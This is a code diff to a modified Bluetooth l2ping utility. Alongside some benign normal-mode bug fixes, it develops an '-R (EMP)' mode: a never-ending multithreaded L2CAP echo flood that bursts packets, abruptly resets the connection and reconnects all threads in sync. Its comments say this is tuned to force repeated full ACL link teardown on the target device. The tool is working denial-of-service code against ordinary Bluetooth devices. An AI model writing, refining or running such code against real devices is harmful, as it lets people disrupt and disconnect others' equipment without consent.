@@ -21,18 +21,23 @@
  *  along with this program; if not, write to the Free Software
  *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
  *
- *  Modified by Ymsniper: added -R (EMP) mode – fire-and-forget, no response waiting,
- *  instant reconnect, never exits. Normal mode (-R absent) is unchanged.
+ *  Modified by Ymsniper: added -R (EMP) mode. Normal mode (-R absent) is unchanged.
  *
- *  Fixes:
- *    - Normal mode: sleep(delay) now always runs, not just on success (was causing
- *      rapid-fire when packets were dropped)
- *    - Normal mode: sent_pkt/recv_pkt increments are now atomic under OpenMP
- *    - Normal mode: removed dead free() calls after stat() which calls exit()
- *    - EMP mode: socket set O_NONBLOCK so failed connects abort fast instead of
- *      blocking for the full BT connection timeout
- *    - EMP mode: send() uses 0 so a full socket buffer never stalls
- *      the loop
+ *  Normal mode fixes:
+ *    - sleep(delay) moved outside !lost block; was skipped on packet loss causing
+ *      rapid-fire with no inter-ping interval
+ *    - sent_pkt/recv_pkt increments wrapped in omp atomic; were data races
+ *    - dead free() calls after stat() removed; stat() calls exit() so they
+ *      could never execute
+ *    - banner wrapped in omp single nowait so only one thread prints it
+ *    - printf changed from id-ident to id; id-ident was always 0 on first packet
+ *
+ *  EMP mode (-R):
+ *    Pure send loop, no recv() or poll() for responses. On send failure the
+ *    socket is closed and reopened immediately. Uses a burst-and-resync loop
+ *    so all threads close and reconnect together, forcing periodic full ACL
+ *    teardown instead of staggered L2CAP channel shuffling. Never exits on
+ *    its own, only on SIGINT.
  */
 
 #ifdef HAVE_CONFIG_H
@@ -157,7 +162,7 @@ static void ping_normal(char *svr)
 	}
 
 	ba2str(&addr.l2_bdaddr, str);
-	/* FIX: only one thread prints the banner */
+	/* Only one thread prints the banner. */
 	#pragma omp single nowait
 	printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);
 
@@ -234,7 +239,7 @@ static void ping_normal(char *svr)
 			}
 		}
 
-		/* FIX: both counters protected under OpenMP; were unguarded data races */
+		/* Both counters are shared across threads; atomic is required. */
 		#pragma omp atomic
 		sent_pkt++;
 
@@ -255,10 +260,10 @@ static void ping_normal(char *svr)
 
 				/* Check payload */
 				if (memcmp(&send_buf[L2CAP_CMD_HDR_SIZE],
-					&recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
+						   &recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
 					fprintf(stderr, "Response payload different.\n");
-				goto error;
-					}
+					goto error;
+				}
 			}
 
 			#ifdef _OPENMP
@@ -272,11 +277,8 @@ static void ping_normal(char *svr)
 			printf("no response from %s: id %d\n", svr, id);
 		}
 
-		/*
-		 * FIX: sleep(delay) moved outside the !lost block.
-		 * Previously it only ran on success — dropped packets caused the next
-		 * send to fire immediately with no inter-ping interval.
-		 */
+		/* Always sleep regardless of whether the packet was lost,
+		 * so the inter-ping interval is consistent. */
 		if (delay)
 			sleep(delay);
 
@@ -284,8 +286,8 @@ static void ping_normal(char *svr)
 			id = ident;
 	}
 
-	/* FIX: free() calls removed after stat(); stat() calls exit() so they
-	 * were dead code. stat() handles the final summary and exits cleanly. */
+	/* stat() prints the summary and calls exit(), so this is the
+	 * normal return path. Cleanup is handled by the error label below. */
 	stat(0);
 
 	error:
@@ -296,16 +298,38 @@ static void ping_normal(char *svr)
 }
 
 /* ------------------------------------------------------------
- *  EMP mode (reconnect == 1): fire-and-forget, no response waiting
- *  - Sends as fast as possible
- *  - Reconnects instantly on send failure
- *  - No output until Ctrl+C
+ *  EMP mode (reconnect == 1): fire-and-forget, synchronized burst-reconnect
+ *
+ *  Architecture:
+ *    All OpenMP threads share one ACL link to the target (BT allows only one
+ *    ACL link per remote per local adapter). If threads reconnect independently
+ *    and staggered, they just reopen L2CAP channels on the existing ACL link
+ *    and the link never fully drops -- the target handles it fine.
+ *
+ *    To force regular full ACL teardowns we use a burst-and-resync loop:
+ *      1. All threads connect (simultaneously after each resync)
+ *      2. Each thread sends EMP_BURST_PKTS packets then closes intentionally
+ *      3. EMP_RESYNC_US sleep after close lets all threads reach closed state
+ *         at roughly the same time
+ *      4. All threads reconnect together -- same synchronized pressure as
+ *         startup, every cycle
+ *
+ *    This guarantees periodic full ACL teardown+setup instead of staggered
+ *    L2CAP channel shuffling that the target can absorb without disconnecting.
  * ----------------------------------------------------------- */
+
+/* Packets per connection before forced close. Tuned for a balance between
+ * flood duration per connection and ACL cycling frequency. */
+#define EMP_BURST_PKTS  50
+
+/* Microseconds all threads sleep after closing, so they reach the connect
+ * phase together and hit the target simultaneously on every cycle. */
+#define EMP_RESYNC_US   5000
+
 static void ping_emp(char *svr)
 {
 	struct sigaction sa;
 	unsigned char *send_buf;
-	uint8_t id = ident;
 	int sk = -1;
 	int i, printed = 0;
 	int reuse = 1;
@@ -322,29 +346,32 @@ static void ping_emp(char *svr)
 	for (i = 0; i < size; i++)
 		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';
 
+	/* Spread packet IDs across threads so they don't all send id=200.
+	 * ident=200, range is 200-254 (55 values). Thread N starts at
+	 * ident + (N % 55) giving each thread a unique starting id. */
+#ifdef _OPENMP
+	uint8_t id = (uint8_t)(ident + (omp_get_thread_num() % 55));
+#else
+	uint8_t id = ident;
+#endif
+
 	while (count == -1 || count-- > 0) {
 		l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
 
-		/* Hammer connect until success */
+		/* --------------------------------------------------
+		 * PHASE 1: CONNECT
+		 * All threads enter this together after each resync.
+		 * -------------------------------------------------- */
 		while (sk < 0) {
-			/*
-			 * 2ms pause between failed attempts.
-			 * BT page scan interval is ~1.28s so spinning faster gains
-			 * nothing — the hardware can't respond faster regardless.
-			 * This cuts per-thread syscall rate from ~10k/s to ~500/s
-			 * and kills the overheating with zero impact on connect speed.
-			 */
-			usleep(2000);
-
+			/* No sleep before first attempt -- startup and post-disconnect
+			 * reconnects are instant. usleep(2000) is added only on each
+			 * failure path below, so the CPU is still protected when the
+			 * target is offline (failed attempts are the hot path). */
 			sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
-			if (sk < 0) continue;
+			if (sk < 0) { usleep(2000); continue; }
 
-			/*
-			 * FIX: set O_NONBLOCK so connect() returns EINPROGRESS
-			 * immediately instead of blocking for the full BT connection
-			 * timeout when the target is slow/unreachable. We then wait
-			 * at most 1 second via poll before giving up and retrying.
-			 */
+			/* O_NONBLOCK: connect() returns EINPROGRESS immediately
+			 * so we never block for the full kernel BT page timeout. */
 			{
 				int fl = fcntl(sk, F_GETFL, 0);
 				if (fl >= 0)
@@ -352,15 +379,15 @@ static void ping_emp(char *svr)
 			}
 
 			setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
-			setsockopt(sk, SOL_SOCKET, SO_LINGER,    &ling,  sizeof(ling));
+			/* SO_LINGER {1,0}: close() sends RST immediately instead of
+			 * a graceful detach -- abrupt teardown on every cycle. */
+			setsockopt(sk, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
 
 			memset(&addr, 0, sizeof(addr));
 			addr.l2_family = AF_BLUETOOTH;
 			bacpy(&addr.l2_bdaddr, &bdaddr);
 			if (bind(sk, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-				close(sk);
-				sk = -1;
-				continue;
+				close(sk); sk = -1; usleep(2000); continue;
 			}
 
 			memset(&addr, 0, sizeof(addr));
@@ -369,34 +396,36 @@ static void ping_emp(char *svr)
 
 			if (connect(sk, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
 				if (errno == EINPROGRESS) {
-					/*
-					 * Wait up to 1.5s for connection to complete.
-					 * BT paging + ACL setup takes 1-3s on recovery, so
-					 * 1s was too short. 1.5s catches recovery reliably
-					 * while keeping reconnect cycling aggressive.
-					 */
+					/* Poll up to 1.5s for connection completion.
+					 * BT paging + ACL setup can take 1-3s on a
+					 * freshly recovered device. 1.5s catches it
+					 * reliably without stalling the cycle too long. */
 					struct pollfd cpf = {sk, POLLOUT, 0};
 					if (poll(&cpf, 1, 1500) > 0) {
 						int err = 0;
 						socklen_t elen = sizeof(err);
 						getsockopt(sk, SOL_SOCKET, SO_ERROR, &err, &elen);
-						if (err != 0) {
-							close(sk);
-							sk = -1;
-							continue;
-						}
-						/* Successfully connected */
+						if (err != 0) { close(sk); sk = -1; usleep(2000); continue; }
 					} else {
-						/* Timed out — close and retry */
-						close(sk);
-						sk = -1;
-						continue;
+						close(sk); sk = -1; usleep(2000); continue;
 					}
 				} else {
-					close(sk);
-					sk = -1;
-					continue;
+					close(sk); sk = -1; usleep(2000); continue;
 				}
+			}
+
+			/* Connected. Switch back to blocking sends so the kernel
+			 * buffer stays full and send pressure is continuous.
+			 * SO_SNDTIMEO caps each send at 300ms so a dead link is
+			 * detected fast without the thread hanging. */
+			{
+				int fl = fcntl(sk, F_GETFL, 0);
+				if (fl >= 0)
+					fcntl(sk, F_SETFL, fl & ~O_NONBLOCK);
+			}
+			{
+				struct timeval snd_tv = {0, 300000}; /* 300ms */
+				setsockopt(sk, SOL_SOCKET, SO_SNDTIMEO, &snd_tv, sizeof(snd_tv));
 			}
 
 			if (!printed) {
@@ -405,51 +434,44 @@ static void ping_emp(char *svr)
 				memset(&addr, 0, sizeof(addr));
 				if (getsockname(sk, (struct sockaddr *)&addr, &optlen) == 0) {
 					ba2str(&addr.l2_bdaddr, str);
-					printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);
+					printf("Ping: %s from %s (data size %d) ...\n",
+					       svr, str, size);
 				}
 				printed = 1;
 			}
-
-			/* Connected: switch to blocking sends capped at 500ms */
-			{
-				int fl = fcntl(sk, F_GETFL, 0);
-				if (fl >= 0)
-					fcntl(sk, F_SETFL, fl & ~O_NONBLOCK);
-			}
-			{
-				struct timeval snd_tv = {0, 500000}; /* 500ms */
-				setsockopt(sk, SOL_SOCKET, SO_SNDTIMEO, &snd_tv, sizeof(snd_tv));
-			}
 		}
 
-		/* Build command header */
-		send_cmd->ident = id;
-		send_cmd->len   = htobs(size);
-		send_cmd->code  = reverse ? L2CAP_ECHO_RSP : L2CAP_ECHO_REQ;
+		/* --------------------------------------------------
+		 * PHASE 2: BURST
+		 * Send EMP_BURST_PKTS frames then close intentionally.
+		 * Short fixed burst keeps ACL cycling frequent.
+		 * -------------------------------------------------- */
+		for (i = 0; i < EMP_BURST_PKTS; i++) {
+			send_cmd->ident = id;
+			send_cmd->len   = htobs(size);
+			send_cmd->code  = reverse ? L2CAP_ECHO_RSP : L2CAP_ECHO_REQ;
 
-		/*
-		 * Blocking send (flag 0). Kernel buffers fill completely and
-		 * the thread pushes continuously -- maximum sustained pressure.
-		 * SO_SNDTIMEO above caps any block at 500ms for fast dead-link
-		 * detection without spinning.
-		 */
-		if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0) {
-			close(sk);
-			sk = -1;
-			continue;   /* retry same packet */
+			if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0)
+				break; /* link died mid-burst, fall through to close */
+
+			#pragma omp atomic
+			sent_pkt++;
+
+			if (++id > 254) id = ident;
 		}
 
-		#pragma omp atomic
-		sent_pkt++;
-
-		if (++id > 254) id = ident;
-
-		if (delay)
-			sleep(delay);
-		/* delay == 0: no sleep — maximum flood */
+		/* --------------------------------------------------
+		 * PHASE 3: FORCED CLOSE + RESYNC
+		 * Always close after each burst regardless of whether
+		 * send failed. The resync sleep gives all threads time
+		 * to also close so the next connect round is synchronized
+		 * -- recreating the full-ACL-teardown pressure every cycle.
+		 * -------------------------------------------------- */
+		close(sk);
+		sk = -1;
+		usleep(EMP_RESYNC_US);
 	}
 
-	if (sk >= 0) close(sk);
 	free(send_buf);
 	stat(0);
 }
@@ -492,72 +514,72 @@ int main(int argc, char *argv[])
 	#ifdef _OPENMP
 	threads = sysconf(_SC_NPROCESSORS_ONLN);
 	while ((opt = getopt(argc, argv, "i:d:s:c:t:n:Rfrv")) != EOF) {
-		#else
-		while ((opt = getopt(argc, argv, "i:d:s:c:t:Rfrv")) != EOF) {
-			#endif
-			switch (opt) {
-				case 'i':
-					if (!strncasecmp(optarg, "hci", 3))
-						hci_devba(atoi(optarg + 3), &bdaddr);
+	#else
+	while ((opt = getopt(argc, argv, "i:d:s:c:t:Rfrv")) != EOF) {
+	#endif
+		switch (opt) {
+			case 'i':
+				if (!strncasecmp(optarg, "hci", 3))
+					hci_devba(atoi(optarg + 3), &bdaddr);
 				else
 					str2ba(optarg, &bdaddr);
 				break;
 
-				case 'd':
-					delay = atoi(optarg);
-					break;
+			case 'd':
+				delay = atoi(optarg);
+				break;
 
-				case 'f':
-					delay = 0;
-					break;
+			case 'f':
+				delay = 0;
+				break;
 
-				case 'r':
-					reverse = 1;
-					break;
+			case 'r':
+				reverse = 1;
+				break;
 
-				case 'v':
-					verify = 1;
-					break;
+			case 'v':
+				verify = 1;
+				break;
 
-				case 'c':
-					count = atoi(optarg);
-					break;
+			case 'c':
+				count = atoi(optarg);
+				break;
 
-				case 't':
-					timeout = atoi(optarg);
-					break;
+			case 't':
+				timeout = atoi(optarg);
+				break;
 
-				case 's':
-					size = atoi(optarg);
-					break;
+			case 's':
+				size = atoi(optarg);
+				break;
 
-				case 'R':
-					reconnect = 1;
-					break;
+			case 'R':
+				reconnect = 1;
+				break;
 
-					#ifdef _OPENMP
-				case 'n':
-					threads = atoi(optarg);
-					break;
-					#endif
+			#ifdef _OPENMP
+			case 'n':
+				threads = atoi(optarg);
+				break;
+			#endif
 
-				default:
-					usage();
-					exit(1);
-			}
+			default:
+				usage();
+				exit(1);
 		}
-
-		if (!(argc - optind)) {
-			usage();
-			exit(1);
-		}
-
-		#ifdef _OPENMP
-		#pragma omp parallel num_threads(threads)
-		#endif
-		{
-			ping(argv[optind]);
-		}
-
-		return 0;
 	}
+
+	if (!(argc - optind)) {
+		usage();
+		exit(1);
+	}
+
+	#ifdef _OPENMP
+	#pragma omp parallel num_threads(threads)
+	#endif
+	{
+		ping(argv[optind]);
+	}
+
+	return 0;
+}
